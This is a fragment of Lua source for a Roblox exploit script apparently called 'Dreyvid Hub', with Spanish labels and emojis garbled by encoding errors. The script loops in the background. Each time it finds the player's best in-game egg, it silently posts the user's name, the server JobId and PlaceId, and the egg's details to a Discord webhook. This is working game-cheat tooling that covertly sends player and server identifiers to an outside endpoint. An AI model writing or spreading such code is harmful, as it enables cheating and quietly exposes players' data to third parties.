    local v372 = "R" .. tostring(p38.Rarity)

    if p38.RarityName and p38.RarityName ~= "" then
        v372 = p38.RarityName .. " (R" .. tostring(p38.Rarity) .. ")"
    end

    local t11 = {
		"=================================",
		"   ðŸ£ NUEVO MEJOR HUEVO - DREYVID HUB",
		"=================================",
		"",
		"ðŸ‘¤ Usuario:      " .. t2.value51.Name,
		"ðŸ£ Huevo:        " .. p38.Name,
		"ðŸ“¦ CategorÃ­a:    " .. (p38.Category or "?"),
		"ðŸ’° Valor:        $" .. t2.value59(p38.Value) .. "/s",
		"ðŸ“ˆ Valor exacto: " .. string.format("%.0f", p38.Value) .. "/s",
		"â­ Rareza:       " .. v372,
		"ðŸ“ Ãrea:         " .. (p38.AreaId or "?"),
		"ðŸ“Š Escala:       x" .. string.format("%.2f", p38.Scale or 1),
		"ðŸ†” Job ID:       " .. tostring(game.JobId or "Unknown"),
		"ðŸ†” Place ID:     " .. tostring(game.PlaceId or "Unknown"),
		"ðŸ•’ Hora:         " .. os.date("%Y-%m-%d %H:%M:%S"),
		"",
		"================================="
	}

    return table.concat(t11, "\n")
end
function t2.value66(p39)
    if not t2.value55 or not p39 then
        return false, "no_request"
    end
    local WebhookName = t2.value53.WebhookName
    local WebhookAvatar = t2.value53.WebhookAvatar
    local v351 = "ðŸ”» **" .. t2.value51.Name .. "** encontrÃ³ un huevo **menor a 500M**"
    local format = string.format
    local value51Name = t2.value51.Name
    local p39Name = p39.Name
    local v355 = v39(p39.Value)
    local AreaId = p39.AreaId
    local _tostring = tostring
    local JobId = game.JobId
    local v359 = format("ðŸ‘¤ **Usuario:** %s\nðŸ£ **Huevo:** %s\nðŸ’° **Valor:** $%s/s\nðŸ“ **Ãrea:** %s\nðŸ†” **Job ID:** `%s`", value51Name, p39Name, v355, AreaId or "?", _tostring(JobId or "Unknown"))
    local t12 = {
		text = "Dreyvid Hub Â· " .. os.date("%H:%M:%S")
	}
    local t13 = {{
		title = "ðŸ”» Huevo Menor a 500M",
		description = v359,
		color = 16711680,
		footer = t12
	}}
    local t14 = {
		username = WebhookName,
		avatar_url = WebhookAvatar,
		content = v351,
		embeds = t13
	}
    local u363 = t14
    local ok, result = pcall(function()
        return t2.value55({
			Url = t2.value52,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json"
			},
			Body = t2.value49:JSONEncode(u363)
		})
    end)
    if ok then
        ok = type(result) == "table"
    end
    if ok then
        return result.StatusCode == 200 or result.StatusCode == 204, result.StatusCode
    end

    return false, tostring(result)
end
function t2.value67(p40)
    if not t2.value55 or not p40 then
        return false, "no_request"
    end

    local v375 = "R" .. tostring(p40.Rarity)

    if p40.RarityName and p40.RarityName ~= "" then
        v375 = p40.RarityName .. " (R" .. tostring(p40.Rarity) .. ")"
    end

    local v376 = string.format("**%s**\n\nðŸ’° **Valor:** $%s/s\nâ­ **Rareza:** %s\nðŸ“ **Ãrea:** %s\nðŸ“Š **Escala:** x%.2f\nðŸ†” **Job ID:** `%s`\nðŸ‘¤ **Usuario:** %s", p40.Name, v39(p40.Value), v375, p40.AreaId or "?", p40.Scale or 1, tostring(game.JobId or "Unknown"), t2.value51.Name)
    local v377 = t2.value65(p40)
    local WebhookName = t2.value53.WebhookName
    local WebhookAvatar = t2.value53.WebhookAvatar
    local v380 = "ðŸ”¥ **" .. t2.value51.Name .. "** encontrÃ³ un huevo **arriba de 500M**"
    local t15 = {
		title = "ðŸ£ NUEVO MEJOR HUEVO",
		description = v376,
		color = 5763719,
		footer = {
			text = "Dreyvid Hub Â· " .. os.date("%H:%M:%S")
		},
		fields = {{
			name = "ðŸ“„ Texto Plano (para copiar en PC)",
			value = "```\n" .. v377 .. "\n```",
			inline = false
		}}
	}
    local t16 = {
		username = WebhookName,
		avatar_url = WebhookAvatar,
		content = v380,
		embeds = { t15 }
	}
    local ok, result = pcall(function()
        return t2.value55({
			Url = t2.value52,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json"
			},
			Body = t2.value49:JSONEncode(t16)
		})
    end)

    if ok then
        ok = type(result) == "table"
    end

    if ok then
        return result.StatusCode == 200 or result.StatusCode == 204, result.StatusCode
    end

    return false, tostring(result)
end
t2.value68 = nil
t2.value69 = 0
task.spawn(function()
    task.wait(2)

    while t2.value53.Enabled do
        local v385 = t2.value64()

        if v385 then
            local elapsed = os.clock()
            local v387 = elapsed - t2.value69

            if v385.Uid ~= t2.value68 and v387 >= t2.value53.CooldownSeconds then
                t2.value68 = v385.Uid
                t2.value69 = elapsed

                if v385.Value >= t2.value53.MinValue then
                    local v388, v389 = t2.value67(v385)

                    if v388 then
                        print(string.format("[Dreyvid] âœ“ Enviado (HIGH): %s ($%s/s) - Usuario: %s", v385.Name, v39(v385.Value), t2.value51.Name))
                    else
                        warn("[Dreyvid] âœ— FallÃ³ HIGH. CÃ³digo:", v389)
                        t2.value68 = nil
                    end
                else
                    local v390, v391 = t2.value66(v385)

                    if v390 then
                        print(string.format("[Dreyvid] âœ“ Enviado (LOW): %s ($%s/s) - Usuario: %s", v385.Name, v39(v385.Value), t2.value51.Name))
                    else
                        warn("[Dreyvid] âœ— FallÃ³ LOW. CÃ³digo:", v391)
                        t2.value68 = nil
                    end
                end
            end
        end

        task.wait(3)
    end
end)
print("[Dreyvid] âœ… Script corriendo (silencioso, filtro 500M+, con avatar y username)")
print("[Dreyvid] ðŸ‘¤ Usuario actual:", t2.value51.Name)
